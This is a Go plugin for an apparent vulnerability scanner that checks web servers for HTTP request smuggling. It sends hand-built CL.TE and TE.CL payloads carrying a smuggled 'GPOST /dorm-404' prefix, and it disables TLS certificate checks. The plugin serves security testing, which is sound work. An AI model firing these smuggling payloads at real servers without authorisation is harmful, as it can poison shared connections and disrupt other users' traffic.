package plugins

import (
	"DORM/models"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"
)

type RequestSmugglingPlugin struct{}

func (p *RequestSmugglingPlugin) Name() string { return "HTTP Request Smuggling (Advanced)" }

func (p *RequestSmugglingPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	connect := func() (net.Conn, error) {
		address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
		dialer := &net.Dialer{Timeout: 5 * time.Second}

		if target.Port == 443 || target.Port == 8443 {
			return tls.DialWithDialer(dialer, "tcp", address, &tls.Config{InsecureSkipVerify: true})
		}
		return net.DialTimeout("tcp", address, 5*time.Second)
	}

	checkSmuggle := func(payload string, attackName string) *models.Vulnerability {
		conn, err := connect()
		if err != nil {
			return nil
		}
		defer conn.Close()

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write([]byte(payload))
		if err != nil {
			return nil
		}

		conn.SetReadDeadline(time.Now().Add(5 * time.Second))

		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil && err != io.EOF {

			return nil
		}
		response := string(buf[:n])

		if strings.Contains(response, "404 Not Found") && strings.Contains(response, "dorm-404") {

			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("Server processed a smuggled request. The follow-up request triggered a 404 for the smuggled path '/dorm-404'.\n\nPayload:\n%s", payload),
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		if strings.Contains(response, "405 Method Not Allowed") {
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: "Server returned 405 Method Not Allowed for the follow-up request, indicating the smuggled prefix 'GPOST' poisoned the socket.",
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		return nil
	}

	smuggledPrefix := "GPOST /dorm-404 HTTP/1.1\r\nFoo: x"

	chunkBody := "0\r\n\r\n" + smuggledPrefix
	finalClTe := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Connection: keep-alive\r\n"+
		"Content-Length: %d\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"%s"+
		"GET / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"\r\n",
		target.IP, len(chunkBody), chunkBody, target.IP)

	if vuln := checkSmuggle(finalClTe, "CL.TE"); vuln != nil {
		return vuln
	}

	teClBody := "1c\r\n" +
		"GPOST /dorm-404 HTTP/1.1\r\n" +
		"Foo: x\r\n" +
		"0\r\n\r\n"

	finalTeCl := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Connection: keep-alive\r\n"+
		"Content-Length: 4\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"%s"+
		"GET / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"\r\n",
		target.IP, teClBody, target.IP)

	if vuln := checkSmuggle(finalTeCl, "TE.CL"); vuln != nil {
		return vuln
	}

	return nil
}
